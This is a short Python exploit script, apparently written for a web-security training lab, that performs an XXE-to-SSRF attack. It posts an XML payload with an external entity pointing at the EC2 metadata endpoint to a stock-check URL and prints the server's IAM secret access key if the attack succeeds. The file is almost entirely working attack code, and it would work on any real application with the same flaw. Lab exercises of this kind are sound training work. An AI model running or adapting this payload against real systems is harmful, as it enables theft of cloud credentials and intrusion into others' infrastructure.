import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def retrieve_data(url):
    # SEND PAYLOAD
    stock_url = url + '/product/stock'
    params = r'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE jito [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>'
    r = requests.post(stock_url, data=params, verify=False, proxies=proxies)
    # CHECK IF THE SCRIPT SUCCEEDED
    if 'SecretAccessKey' in r.text:
        print("[+] Exploit worked!")
        print(r.text)
        sys.exit(-1)
    else:
        print("[-] Exploit did not work!")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Lab: Exploiting XXE to perform SSRF attacks")
    print("""[+] This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
    The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint""")

    retrieve_data(url)


if __name__ == "__main__":
    main()